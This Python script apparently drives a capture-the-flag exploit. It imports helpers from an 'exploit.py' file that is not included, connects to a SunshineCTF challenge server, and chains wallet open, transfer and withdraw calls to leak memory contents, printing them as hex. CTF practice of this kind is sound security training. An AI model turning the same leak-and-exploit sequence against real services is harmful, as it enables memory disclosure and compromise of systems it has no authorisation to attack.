import sys
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "exploit.py")
ex = importlib.util.module_from_spec(spec); spec.loader.exec_module(ex)
R, open_wallet, transfer, withdraw, deposit = ex.Remote, ex.open_wallet, ex.transfer, ex.withdraw, ex.deposit

r = R("chal.sunshinectf.games", 26004)
r.pump(1.5); r.expect(b">>>")
open_wallet(r, b"A", 48); open_wallet(r, b"C", 48); open_wallet(r, b"F", 48)
print("t1:", transfer(r, 0, 1)[-200:])
print("leakX:", withdraw(r, 1, 48).hex())
r.buf = b""
try:
    print("t2:", transfer(r, 2, 1)[-260:])
except Exception as e:
    print("t2 raised:", e, "| buf:", repr(r.buf[-300:]))
r.pump(1.5)
print("after t2 buf:", repr(r.buf[-400:]), "eof:", getattr(r, "eof", None))
try:
    print("leakW:", withdraw(r, 1, 48).hex())
except Exception as e:
    print("leakW raised:", e, "| buf:", repr(r.buf[-300:]))
